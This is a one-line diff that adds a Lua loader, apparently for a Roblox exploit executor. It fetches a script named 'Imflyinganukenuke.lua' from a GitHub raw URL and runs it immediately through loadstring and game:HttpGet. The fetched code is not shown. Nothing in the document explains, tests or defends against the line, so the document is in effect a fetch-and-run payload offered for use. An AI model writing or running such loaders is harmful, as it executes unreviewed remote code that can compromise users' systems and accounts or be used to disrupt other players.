@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CommonSense12/NOOOOOO/refs/heads/main/Imflyinganukenuke.lua"))()
